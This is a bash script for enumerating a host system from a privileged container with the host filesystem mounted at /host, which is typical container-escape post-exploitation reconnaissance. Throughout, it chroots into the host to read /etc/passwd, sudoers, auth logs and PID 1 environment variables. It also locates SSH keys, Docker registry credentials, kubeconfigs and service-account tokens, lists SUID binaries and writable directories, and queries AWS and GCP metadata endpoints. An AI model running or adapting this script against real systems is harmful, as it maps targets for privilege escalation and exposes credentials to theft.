#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "[*] System Information"
echo "----------------------"
chroot /host uname -a 2>/dev/null || echo "Cannot chroot"
echo ""
chroot /host cat /etc/os-release 2>/dev/null | head -10
echo ""
chroot /host cat /proc/version 2>/dev/null
echo ""
chroot /host hostname 2>/dev/null
echo ""

echo "[*] Kernel Information"
echo "----------------------"
chroot /host uname -r 2>/dev/null
chroot /host cat /proc/cmdline 2>/dev/null
echo ""

echo "[*] Hardware Information"
echo "----------------------"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5
chroot /host cat /proc/meminfo 2>/dev/null | head -5
echo ""

echo "[*] Network Configuration"
echo "----------------------"
echo "Interfaces:"
chroot /host ip addr show 2>/dev/null || chroot /host ifconfig 2>/dev/null || cat /host/proc/net/dev
echo ""
echo "Routing Table:"
chroot /host ip route 2>/dev/null || cat /host/proc/net/route
echo ""
echo "ARP Table:"
cat /host/proc/net/arp 2>/dev/null
echo ""

echo "[*] Listening Services"
echo "----------------------"
chroot /host netstat -tulpn 2>/dev/null | head -20 || \
chroot /host ss -tulpn 2>/dev/null | head -20 || \
echo "netstat/ss not available, checking /proc/net/tcp"
cat /host/proc/net/tcp 2>/dev/null | head -10
echo ""

echo "[*] Users and Groups"
echo "----------------------"
echo "Users:"
chroot /host cat /etc/passwd 2>/dev/null | head -20
echo ""
echo "Groups:"
chroot /host cat /etc/group 2>/dev/null | head -20
echo ""
echo "Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null 2>/dev/null | grep -v "^#" | grep -v "^$" | head -10
echo ""

echo "[*] Running Processes"
echo "----------------------"
chroot /host ps aux 2>/dev/null | head -20 || cat /host/proc/*/comm 2>/dev/null | head -20
echo ""

echo "[*] System Services"
echo "----------------------"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || \
chroot /host service --status-all 2>/dev/null | head -20 || \
echo "systemctl/service not available"
echo ""

echo "[*] Installed Packages"
echo "----------------------"
chroot /host dpkg -l 2>/dev/null | head -20 || \
chroot /host rpm -qa 2>/dev/null | head -20 || \
echo "Package manager not detected"
echo ""

echo "[*] Docker Information"
echo "----------------------"
chroot /host docker version 2>/dev/null | head -10 || echo "Docker CLI not found"
chroot /host docker ps -a 2>/dev/null | head -10 || echo "Cannot list containers"
chroot /host docker images 2>/dev/null | head -10 || echo "Cannot list images"
echo ""

echo "[*] Kubernetes Components"
echo "----------------------"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "Kubernetes config not found"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -5
find /host -path "*/.kube/config" 2>/dev/null | head -5
echo ""

echo "[*] Credentials and Sensitive Files"
echo "----------------------"
echo "SSH Keys:"
ls -la /host/root/.ssh/ 2>/dev/null | head -10 || echo "No root SSH keys"
find /host/home -name ".ssh" -type d 2>/dev/null | head -5
echo ""
echo "Docker Config:"
cat /host/root/.docker/config.json 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "No Docker config"
find /host/home -name ".docker" -type d 2>/dev/null | head -5
echo ""
echo "Kubernetes Configs:"
find /host -path "*/.kube/config" 2>/dev/null | head -5
find /host -name "kubeconfig" 2>/dev/null | head -5
echo ""

echo "[*] Environment Variables (from /proc)"
echo "----------------------"
cat /host/proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20
echo ""

echo "[*] Scheduled Tasks"
echo "----------------------"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$"
chroot /host crontab -l 2>/dev/null || echo "No user crontab"
find /host/etc/cron.* -type f 2>/dev/null | head -10
echo ""

echo "[*] File System Information"
echo "----------------------"
chroot /host df -h 2>/dev/null | head -10
echo ""
chroot /host mount 2>/dev/null | head -20
echo ""

echo "[*] SUID/SGID Binaries"
echo "----------------------"
find /host -perm -4000 -type f 2>/dev/null | head -20
echo ""

echo "[*] Writable Directories"
echo "----------------------"
find /host/tmp -writable -type d 2>/dev/null | head -10
find /host/var/tmp -writable -type d 2>/dev/null | head -10
echo ""

echo "[*] Cloud Provider Metadata"
echo "----------------------"
echo "AWS (169.254.169.254):"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "Not AWS"
echo ""
echo "GCP:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "Not GCP"
echo ""

echo "[*] Recent Log Files"
echo "----------------------"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || \
chroot /host tail -20 /var/log/secure 2>/dev/null || \
echo "Auth logs not accessible"
echo ""

echo "=========================================="
echo "  Enumeration Complete"
echo "=========================================="
